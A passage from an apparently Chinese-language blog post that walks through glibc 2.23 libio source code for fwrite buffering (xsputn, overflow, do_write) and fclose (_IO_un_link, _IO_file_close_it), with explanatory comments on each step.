(f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)<br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <br><br><span class="hljs-comment">//如果缓冲区还有空间则先把数据拷贝进缓冲区</span><br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>count = to_do;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      <span class="hljs-built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);<br>      f-&gt;_IO_write_ptr += count;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      s += count;<br>      to_do -= count;<br>    &#125;<br><span class="hljs-comment">//如果还有数据剩余则说明缓冲区未建立或已满</span><br>  <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      _IO_size_t block_size, do_write;<br><span class="hljs-comment">//调用_IO_OVERFLOW清空缓冲区或建立缓冲区</span><br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)<br><br><span class="hljs-keyword">return</span> to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br><br><span class="hljs-comment">//检查数据是否大块，是则更新count为小块数据数量</span><br>      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>      do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br> <span class="hljs-comment">//调用new_do_write输出s中的大块数据，不经缓冲区</span><br>      <span class="hljs-keyword">if</span> (do_write)<br>&#123;<br>  count = new_do_write (f, s, do_write);<br>  to_do -= count;<br>  <span class="hljs-keyword">if</span> (count &lt; do_write)<br>    <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br><br>      <span class="hljs-keyword">if</span> (to_do)<br>to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h2><p>_IO_OVERFLOW实际上就是跳转表中的_IO_new_file_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">int</span><br>_IO_new_file_overflow (_IO_FILE *f, <span class="hljs-type">int</span> ch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span><br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">/* If currently reading or no buffer allocated. */</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">//如果缓冲区未建立则调用_IO_doallocbuf建立缓冲区</span><br>  _IO_doallocbuf (f);<br>  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);<br>&#125;<br><span class="hljs-comment">//如果有backup则调用backup</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))<br>&#123;<br>  <span class="hljs-type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;<br>  _IO_free_backup_area (f);<br>  f-&gt;_IO_read_base -= MIN (nbackup,<br>   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);<br>  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;<br>&#125;<br><span class="hljs-comment">//初始化指针</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)<br>f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;<br>      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;<br>      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;<br>      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;<br>      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;<br><br>      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-keyword">if</span> (f-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;<br>    &#125;<br><span class="hljs-comment">//调用_IO_do_write清空缓冲区，注意第二个参数是f-&gt;_IO_write_base</span><br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  *f-&gt;_IO_write_ptr++ = ch;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)<br>      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="hljs-string">&#x27;\n&#x27;</span>))<br>    <span class="hljs-keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<br>      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) ch;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-new-do-write"><a href="#IO-new-do-write" class="headerlink" title="_IO_new_do_write"></a>_IO_new_do_write</h3><p>_IO_do_write实际上是_IO_new_do_write（宏定义），调用了new_do_write，_IO_file_xsputn后续步骤也调用了这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">int</span><br>_IO_new_do_write (_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)<br>&#123;<br>  <span class="hljs-keyword">return</span> (to_do == <span class="hljs-number">0</span><br>  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="hljs-number">0</span> : EOF;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="new-do-write"><a href="#new-do-write" class="headerlink" title="new_do_write"></a>new_do_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">static</span><br>_IO_size_t<br><span class="hljs-title function_">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)</span><br>&#123;<br><span class="hljs-comment">//一些判断</span><br>  _IO_size_t count;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<br>    fp-&gt;_offset = _IO_pos_BAD;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br><span class="hljs-comment">//调用_IO_SYSWRITE清空缓冲区</span><br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)<br>    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="hljs-number">1</span>, data, count) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//更新指针</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-new-file-write"><a href="#IO-new-file-write" class="headerlink" title="_IO_new_file_write"></a>_IO_new_file_write</h3><p>_IO_SYSWRITE实际上就是跳转表中的_IO_file_write（_IO_new_file_write），调用系统调用清空缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_ssize_t<br>_IO_new_file_write (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_ssize_t n)<br>&#123;<br>  _IO_ssize_t to_do = n;<br>  <span class="hljs-keyword">while</span> (to_do &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2<br>     &amp; _IO_FLAGS2_NOTCANCEL, <span class="hljs-number">0</span>)<br>   ? write_not_cancel (f-&gt;_fileno, data, to_do)<br>   : write (f-&gt;_fileno, data, to_do));<br>      <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">0</span>)<br>&#123;<br>  f-&gt;_flags |= _IO_ERR_SEEN;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br>      to_do -= count;<br>      data = (<span class="hljs-type">void</span> *) ((<span class="hljs-type">char</span> *) data + count);<br>    &#125;<br>  n -= to_do;<br>  <span class="hljs-keyword">if</span> (f-&gt;_offset &gt;= <span class="hljs-number">0</span>)<br>    f-&gt;_offset += n;<br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-default-xsputn"><a href="#IO-default-xsputn" class="headerlink" title="_IO_default_xsputn"></a>_IO_default_xsputn</h2><p>调用_IO_OVERFLOW清空缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br>_IO_size_t<br>_IO_default_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span> *) data;<br>  _IO_size_t more = n;<br>  <span class="hljs-keyword">if</span> (more &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>      <span class="hljs-comment">/* Space available. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)<br>&#123;<br>  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> (count &gt; more)<br>    count = more;<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">20</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">//输出长度大于20，调用memcpy拷贝</span><br>      <span class="hljs-built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);<br>      f-&gt;_IO_write_ptr += count;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      s += count;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (count)<br>    &#123;<br><span class="hljs-comment">//小于20直接赋值</span><br>      <span class="hljs-type">char</span> *p = f-&gt;_IO_write_ptr;<br>      _IO_ssize_t i;<br>      <span class="hljs-keyword">for</span> (i = count; --i &gt;= <span class="hljs-number">0</span>; )<br>*p++ = *s++;<br>      f-&gt;_IO_write_ptr = p;<br>    &#125;<br>  more -= count;<br>&#125;<br><span class="hljs-comment">//调用_IO_OVERFLOW清空缓冲区</span><br>      <span class="hljs-keyword">if</span> (more == <span class="hljs-number">0</span> || _IO_OVERFLOW (f, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s++) == EOF)<br><span class="hljs-keyword">break</span>;<br>      more--;<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - more;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="注意一点"><a href="#注意一点" class="headerlink" title="注意一点"></a>注意一点</h2><p>main函数返回的时候_IO_cleanup会调用_IO_flush_all_lockp函数最终调用系统函数write清空缓冲区之后讨论</p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><p>函数调用流程图：</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fclose.jpg" class title="fclose"><p>fclose实际上是_IO_new_fclose</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofclose.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_fclose fclose</span><br></code></pre></td></tr></table></figure><p>_IO_new_fclose函数的执行流程如下：</p><ul><li>调用_IO_un_link将fp从_IO_list_all单链表中摘除</li><li>调用_IO_file_close_it关闭文件并释放缓冲区</li><li>调用_IO_FINISH（_IO_new_file_finish）确定_IO_FILE已从链表中取出且缓冲区已释放</li><li>如果fp不是标准输入、输出或错误，则释放fp结构体<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofclose.c</span><br><br><span class="hljs-type">int</span><br>_IO_new_fclose (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">int</span> status;<br><br>  CHECK_FILE(fp, EOF);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> _IO_old_fclose (fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//步骤一：调用_IO_un_link将fp从_IO_list_all单链表中摘除</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><br>  _IO_acquire_lock (fp);<br><span class="hljs-comment">//步骤二：关闭文件并释放缓冲区</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it (fp);<br>  <span class="hljs-keyword">else</span><br>    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="hljs-number">-1</span> : <span class="hljs-number">0</span>;<br>  _IO_release_lock (fp);<br><span class="hljs-comment">//步骤三：确定_IO_FILE已从链表中取出且缓冲区已释放</span><br>  _IO_FINISH (fp);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _LIBC</span><br>      <span class="hljs-comment">/* This stream has a wide orientation.  This means we have to free</span><br><span class="hljs-comment"> the conversion functions.  */</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span> =</span> fp-&gt;_codecvt;<br><br>      __libc_lock_lock (__gconv_lock);<br>      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);<br>      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);<br>      __libc_lock_unlock (__gconv_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>_IO_free_backup_area (fp);<br>    &#125;<br><span class="hljs-comment">//步骤四：如果fp不是标准输入、输出或错误，则释放fp结构体</span><br>  <span class="hljs-keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)<br>    &#123;<br>      fp-&gt;_IO_file_flags = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">free</span>(fp);<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-un-link-1"><a href="#IO-un-link-1" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_un_link (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> **<span class="hljs-title">f</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//如果_IO_list_all非空且头节点为fp则取下头节点</span><br>      <span class="hljs-keyword">if</span> (_IO_list_all == <span class="hljs-literal">NULL</span>)<br>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp == _IO_list_all)<br>&#123;<br>  _IO_list_all = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;<br>  ++_IO_list_all_stamp;<br>&#125;<br><span class="hljs-comment">//否则遍历单链表搜索fp并取下，修改标志位</span><br>      <span class="hljs-keyword">else</span><br><span class="hljs-keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)<br>  <span class="hljs-keyword">if</span> (*f == (_IO_FILE *) fp)<br>    &#123;<br>      *f = fp-&gt;file._chain;<br>      ++_IO_list_all_stamp;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>      fp-&gt;file._flags &amp;= ~_IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-file-close-it"><a href="#IO-file-close-it" class="headerlink" title="_IO_file_close_it"></a>_IO_file_close_it</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c </span><br><br><span class="hljs-type">int</span><br>_IO_new_file_close_it (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">int</span> write_status;<br>  <span class="hljs-keyword">if</span> (!_IO_file_is_open (fp))<br>    <span class="hljs-keyword">return</span> EOF;<br><br><span class="hljs-comment">//调用_IO_do_flush（_IO_do_write）刷新缓冲区</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="hljs-number">0</span><br>      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="hljs-number">0</span>)<br>    write_status = _IO_do_flush (fp);<br>  <span class="hljs-keyword">else</span><br>    write_status = <span class="hljs-number">0</span>;<br><br>  _IO_unsave_markers (fp);<br><br><span class="hljs-comment">//调用_IO_SYSCLOSE，跳转表中的_IO_file_close</span><br>  <span class="hljs-type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="hljs-number">0</span><br>      ? _IO_SYSCLOSE (fp) : <span class="hljs-number">0</span>);<br><br>  <span class="hljs-comment">/* Free buffer. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_have_wbackup (fp))<br>_IO_free_wbackup_area (fp);<br>      _IO_wsetb (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>      _IO_wsetg (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>      _IO_wsetp (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//释放输入输出缓冲区并设置指针</span><br>  _IO_setb (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//设置base指针，并释放缓冲区</span><br>  _IO_setg (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//置空输入缓冲区</span><br>  _IO_setp (fp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//置空输出缓冲区</span><br><br><span 